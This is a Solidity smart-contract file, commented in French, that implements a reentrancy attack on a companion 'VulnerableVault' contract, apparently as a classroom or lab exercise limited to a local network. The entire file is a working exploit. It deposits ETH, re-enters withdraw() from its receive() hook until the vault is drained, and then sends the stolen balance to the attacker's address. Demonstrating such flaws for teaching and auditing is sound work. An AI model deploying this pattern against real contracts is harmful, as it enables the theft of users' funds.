// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title Attacker
/// @notice Contrat d'exploitation de la faille reentrancy de VulnerableVault.
///         Usage pedagogique, reseau local uniquement.
contract Attacker {
    VulnerableVault public immutable vault;
    address public immutable owner;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        owner = msg.sender;
    }

    /// @notice Lance l'attaque : depose un montant, puis retire en boucle
    function attack() external payable {
        require(msg.value > 0, "Envoyer de l'ETH pour attaquer");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    /// @notice Appele automatiquement a chaque reception d'ETH
    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }

    /// @notice Recuperer les fonds voles vers le compte de l'attaquant
    function collect() external {
        require(msg.sender == owner, "Pas autorise");
        payable(owner).transfer(address(this).balance);
    }
}
